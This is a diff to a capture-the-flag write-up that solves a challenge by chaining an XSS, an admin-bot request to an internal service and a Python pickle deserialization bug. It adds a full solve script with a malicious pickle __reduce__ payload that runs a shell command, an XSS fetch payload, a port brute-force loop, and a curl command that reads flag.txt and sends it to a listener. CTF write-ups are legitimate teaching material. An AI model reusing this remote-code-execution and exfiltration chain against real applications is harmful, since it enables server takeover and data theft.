@@ -401,4 +401,100 @@ Luckily we can make use of the XSS to do this
 That would work because when the admin bot visits our path it would set the cookie `secret` to hold the `SECRET` value and the `/query` route on the main server checks if the `secret` cookie value equals the `SECRET` value
 
 Ok so it's clear now:
-- We need to make an XSS payload such that it would make the admin bot access the `/query` route by sending a `POST` request with body of the url pointing to the internal web service which has the deserialization bug passing the GET parameter `pickle` which holds the deserialization payload
+- We need to craft an XSS payload that triggers the admin bot to send a POST request to the /query route.
+- The request's body should contain a URL pointing to an internal web service with a deserialization vulnerability.
+- The URL should include a GET parameter named pickle, which carries the deserialization payload
+
+To achieve this I made use of the javascript [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) api
+
+And for the internal web service port I just brute forced because it's feasible
+
+Here's my solve scrpt
+
+```python
+import requests
+import json
+import pickle, os
+
+
+class Pickle:
+    def __reduce__(self):
+        return (os.system,("curl http://localhost:8888/?flag=`cat flag.txt`",))
+
+
+def visit(url, path):
+    data = {
+        'path': path
+    }
+
+    res = requests.post(url + '/visit', data=data)
+    print(f'DEBUG: {res.text}')
+    
+
+WEB_URL = "http://127.0.0.1:1337"
+BOT_URL = "http://127.0.0.1:1336"
+
+def solve(port):
+    obj = Pickle()
+    pickled = pickle.dumps(obj)
+    print(f'Pickled data: {pickled.hex()}')
+
+    xss = f"""
+    <script>
+        fetch('/query', {{
+            method: 'POST',
+            mode: 'cors',
+            credentials: 'include',
+            headers: {{
+                'Content-Type': 'application/json',
+            }},
+            body: JSON.stringify({{
+                'url': 'http://127.0.0.1:{port}/pickle?pickle={pickled.hex()}'
+            }})
+        }});
+    </script>
+    """.strip().replace('\n', '')
+
+    encoded = requests.utils.quote(xss)
+    path = '?name=' + encoded
+    print(encoded)
+
+    visit(BOT_URL, path)
+
+
+for port in range(5700, 6000):
+    solve(port)
+```
+
+My deserialization payload would basically do this:
+
+```
+curl http://localhost:8888/?flag=`cat flag.txt`
+```
+
+We just need to set a listener on port 8888 to receive the flag!
+![image](https://github.com/user-attachments/assets/6bba2413-0c31-4101-a44c-8777696aa3d1)
+
+
+This is the overall XSS payload
+
+```javascript
+<script>
+    fetch('/query', {{
+        method: 'POST',
+        mode: 'cors',
+        credentials: 'include',
+        headers: {{
+            'Content-Type': 'application/json',
+        }},
+        body: JSON.stringify({{
+            'url': 'http://127.0.0.1:{port}/pickle?pickle={pickled.hex()}'
+        }})
+    }});
+</script>
+```
+
+Very fun challenge which involves chaining three vulnerabilities
+
+And that's all!
+
